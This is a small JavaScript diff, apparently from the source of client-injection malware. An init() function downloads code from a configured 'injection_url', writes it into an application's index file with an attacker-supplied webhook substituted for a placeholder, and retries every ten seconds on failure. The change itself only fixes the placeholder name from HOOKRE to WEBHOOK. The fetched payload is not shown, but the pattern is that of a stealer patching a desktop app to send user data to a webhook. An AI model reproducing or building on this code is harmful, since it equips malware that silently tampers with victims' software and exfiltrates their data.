@@ -482,7 +482,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 require("${appPath}/app.asar")
